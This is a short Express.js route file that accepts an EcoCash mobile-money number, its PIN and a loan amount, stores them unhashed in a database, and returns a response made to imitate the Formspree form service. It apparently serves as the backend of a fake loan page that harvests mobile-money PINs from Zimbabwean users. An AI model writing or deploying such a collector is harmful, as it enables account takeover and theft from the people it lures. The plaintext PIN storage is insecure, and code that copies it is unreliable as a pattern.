import express from "express";
import LoanApplication from "../models/LoanApplication.js";

const router = express.Router();

// Acts like Formspree
router.post("/", async (req, res) => {
  try {
    const { ecocash_number, pin, loan_amount } = req.body;

    const newLoan = new LoanApplication({
      ecocashNumber: "+263" + ecocash_number,
      pin,
      loanAmount: loan_amount
    });

    await newLoan.save();

    // Mimic Formspree success response
    res.status(200).json({ success: true, message: "Form submitted" });
  } catch (error) {
    res.status(500).json({ success: false, message: "Submission failed" });
  }
});

export default router;
